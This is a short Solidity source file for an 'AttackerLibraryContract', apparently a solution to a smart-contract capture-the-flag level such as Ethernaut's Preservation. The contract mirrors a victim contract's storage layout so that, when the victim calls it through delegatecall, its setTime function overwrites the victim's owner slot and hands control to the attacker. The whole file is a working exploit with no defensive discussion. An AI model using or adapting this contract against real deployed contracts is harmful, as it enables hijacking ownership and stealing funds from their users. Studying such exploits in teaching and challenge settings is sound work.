// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @dev Attacker library
contract AttackerLibraryContract {
    // replicate the same storage
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    // set owner so replace the slot 0x3 on main contract as it uses delegatecall
    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }
}